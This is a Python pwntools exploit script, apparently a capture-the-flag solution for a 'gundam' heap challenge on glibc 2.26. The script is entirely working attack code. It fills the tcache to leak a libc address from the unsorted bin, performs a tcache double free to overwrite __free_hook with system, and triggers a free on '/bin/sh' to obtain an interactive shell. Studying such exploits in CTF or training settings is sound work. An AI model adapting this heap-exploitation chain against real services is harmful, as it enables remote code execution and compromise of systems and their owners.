from pwn import *

io = remote('0.0.0.0', 10001)		# io = process('./gundam_debug')
libc = ELF('/usr/local/glibc-2.26/lib/libc-2.26.so')

def build(name):
	io.sendlineafter("choice : ", '1')
	io.sendlineafter("gundam :", name)
	io.sendlineafter("gundam :", '0')

def visit():
	io.sendlineafter("choice : ", '2')

def destroy(idx):
	io.sendlineafter("choice : ", '3')
	io.sendlineafter("Destory:", str(idx))

def blow_up():
	io.sendlineafter("choice : ", '4')

def leak():
	global free_hook_addr
	global system_addr

	for i in range(9):
		build('A'*7)
	for i in range(7):
		destroy(i)					# tcache bin
	destroy(7)						# unsorted bin

	blow_up()
	for i in range(8):
		build('A'*7)

	visit()
	leak =  u64(io.recvuntil("Type[7]", drop=True)[-6:].ljust(8, '\x00'))
	libc_base = leak - 0x3abc78		# libc_base - leak
	free_hook_addr = libc_base + libc.symbols['__free_hook']
	system_addr = libc_base + libc.symbols['system']

	log.info("libc base: 0x%x" % libc_base)
	log.info("__free_hook address: 0x%x" % free_hook_addr)
	log.info("system address: 0x%x" % system_addr)

def overwrite():
	destroy(2)
	destroy(1)
	destroy(0)
	destroy(0)						# double free

	blow_up()
	build(p64(free_hook_addr))		# fd = &__free_hook
	build('/bin/sh\x00')				# fd = /bin/sh
	build(p64(system_addr))			# __free_hook = &system

def pwn():
	destroy(1)
	io.interactive()

if __name__ == "__main__":
	leak()
	overwrite()
	pwn()
